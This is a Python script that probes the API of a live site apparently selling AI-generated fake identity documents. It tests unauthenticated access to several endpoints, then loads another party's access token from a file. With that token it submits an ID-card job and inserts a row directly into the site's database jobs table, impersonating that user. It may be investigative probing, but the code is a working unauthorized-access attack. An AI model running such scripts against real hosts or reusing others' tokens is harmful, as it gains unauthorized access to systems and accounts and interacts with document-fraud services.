import ssl, json, urllib.request, urllib.error, io

ctx = ssl.create_default_context()
KEY = "<publishable-key>"
tok = json.loads(open("their_token.txt", encoding="utf-8").read())["access_token"]
B = "https://onlyfakeai.ru"

def req(method, url, body=None, token=None, extra=None, raw=None):
    h = {"User-Agent": "Mozilla/5.0"}
    if token:
        h["Authorization"] = f"Bearer {token}"
    if extra:
        h.update(extra)
    data = raw
    if data is None and body is not None:
        h["Content-Type"] = "application/json"
        data = json.dumps(body).encode()
    r = urllib.request.Request(url, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=40, context=ctx) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()
    except Exception as e:
        return 0, {}, str(e).encode()

print("=== 1. generate-qr unauthenticated ===")
st, hd, raw = req("POST", B + "/api/generate-qr", body={"data": "RAT4080TEST"})
print(st, hd.get("Content-Type"), len(raw), raw[:60])

print("\n=== 2. generate-code128 unauthenticated ===")
st, hd, raw = req("POST", B + "/api/generate-code128", body={"data": "RAT4080TEST"})
print(st, hd.get("Content-Type"), len(raw), raw[:60])

print("\n=== 3. remove-background unauthenticated (tiny png) ===")
png = (b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01"
       b"\x08\x02\x00\x00\x00\x90wS\xde\x00\x00\x00\x0cIDATx\x9cc\xf8\xff"
       b"\xff?\x00\x05\xfe\x02\xfe\xdc\xccY\xe7\x00\x00\x00\x00IEND\xaeB`\x82")
boundary = "----rat4080boundary"
body = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; "
        f"filename=\"t.png\"\r\nContent-Type: image/png\r\n\r\n").encode() + png + f"\r\n--{boundary}--\r\n".encode()
st, hd, raw = req("POST", B + "/api/remove-background", raw=body,
                  extra={"Content-Type": f"multipart/form-data; boundary={boundary}"})
print(st, hd.get("Content-Type"), len(raw), raw[:150])

print("\n=== 4. submit-photoshop-job with their token (credit gate) ===")
minimal = {
    "country": "france", "documentType": "id_card",
    "firstName": "Test", "lastName": "Test",
    "photo": "test", "metadataEnabled": False,
}
st, hd, raw = req("POST", B + "/api/submit-photoshop-job", body=minimal, token=tok)
print(st, raw[:300])

print("\n=== 5. jobs table insert as their token ===")
st, hd, raw = req("POST",
                  "https://cdn.onlyfakeai.ru/rest/v1/jobs",
                  body={"user_id": "<redacted-user-uuid>",
                        "status": "pending", "document_type": "id_card",
                        "country": "test"},
                  token=tok, extra={"apikey": KEY, "Prefer": "return=representation"})
print(st, raw[:300])
